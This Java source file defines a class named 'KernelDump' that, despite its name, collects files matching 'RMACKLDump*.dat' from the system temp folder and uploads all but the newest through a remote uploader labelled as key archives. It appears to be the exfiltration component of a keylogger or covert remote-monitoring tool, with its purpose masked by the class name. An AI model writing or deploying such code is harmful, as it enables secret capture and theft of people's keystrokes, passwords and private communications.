package com.rmac.core;

import com.rmac.Main;
import com.rmac.utils.ArchiveFileType;
import com.rmac.utils.Constants;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import lombok.extern.slf4j.Slf4j;

@Slf4j
public class KernelDump implements Runnable {

  public Thread thread;

  public KernelDump() {
    thread = new Thread(this, "KernelDump");
    thread.start();
  }

  @Override
  public void run() {
    List<File> dumps = getAllLogFiles(Constants.SYS_TEMP_LOCATION);
    dumps.forEach(dump -> Main.uploader.uploadFile(dump, ArchiveFileType.KEY));
  }

  private List<File> getAllLogFiles(String dirPath) {
    File[] logFiles = new File(dirPath).listFiles(
        (dir, name) -> name.endsWith(".dat") && name.startsWith("RMACKLDump")
    );

    List<File> dumps = new ArrayList<>();

    long newestModified = Long.MIN_VALUE;
    File newestFile = null;
    if (logFiles != null) {
      for (File f : logFiles) {
        if (f.lastModified() > newestModified) {
          newestModified = f.lastModified();
          newestFile = f;
        }
      }

      for (File f : logFiles) {
        if (f != newestFile) {
          dumps.add(f);
        }
      }
    }

    return dumps;
  }
}
